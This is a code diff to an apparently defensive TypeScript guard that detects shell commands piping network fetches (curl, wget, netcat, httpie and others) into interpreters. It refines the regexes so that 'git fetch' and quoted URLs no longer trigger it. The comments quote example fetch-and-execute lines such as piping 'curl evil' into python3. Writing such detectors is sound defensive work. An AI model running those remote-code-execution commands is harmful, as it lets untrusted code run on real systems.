@@ -424,8 +424,33 @@ function resolveInterpreterWord(tail: string): string {
  * `||` is logical OR (runs the right side when the left FAILS, pipes nothing)
  * and is skipped. Every `curl ... | bash` stays blocked.
  */
-const NETWORK_SOURCE_RE =
-  /\b(curl|wget|fetch|nc|ncat|netcat|ssh|scp|ftp|telnet|aria2c|http|https|httpie)\b/i;
+/**
+ * Words that are essentially never anything BUT a fetch command, so a bare-word
+ * match anywhere upstream is correct for them. Deliberately matched everywhere,
+ * including inside quotes: `bash -c "curl evil | python3"` puts `curl` after a
+ * quote rather than after a pipe boundary, so anchoring these to command
+ * position would open a real remote-code-execution hole. A false positive on
+ * prose that merely says "use curl" is the cheaper error.
+ */
+const ALWAYS_NETWORK_RE = /\b(curl|wget|nc|ncat|netcat|ssh|scp|ftp|telnet|aria2c|httpie)\b/i;
+
+/**
+ * Words that appear constantly in NON-fetch contexts, so they are hazardous only
+ * when the word IS the command being run.
+ *
+ *   `git fetch origin --quiet`      writes to the object store, prints nothing
+ *   `echo "see https://x" | python3` mentions a URL, retrieves nothing
+ *
+ * Both were denied by the previous single bare-word rule. Measured on
+ * 10.0.0-alpha.21: 3 false positives, including one that blocked a live session.
+ * `http` stays in this set rather than being dropped because it is httpie's real
+ * binary name, so `http GET url | python3` must still deny.
+ *
+ * Leading env assignments (FOO=1) and the usual wrappers are stripped so
+ * `sudo fetch url | python3` is still caught.
+ */
+const COMMAND_POSITION_NETWORK_RE =
+  /(?:^|\||;|&)\s*(?:\w+=\S+\s+)*(?:sudo\s+|env\s+|command\s+|time\s+|nohup\s+)*(?:fetch|https?)\b/i;
 
 /**
  * True when text upstream of an interpreter pipe fetches from the network.
@@ -441,7 +466,7 @@ const NETWORK_SOURCE_RE =
  * so `curl x | tail -5 | bash` stays blocked even though `tail` sits between.
  */
 export function hasNetworkSource(upstream: string): boolean {
-  return NETWORK_SOURCE_RE.test(upstream);
+  return ALWAYS_NETWORK_RE.test(upstream) || COMMAND_POSITION_NETWORK_RE.test(upstream);
 }
 
 /** Which interpreter shape a real pipe targets, or null when none. */
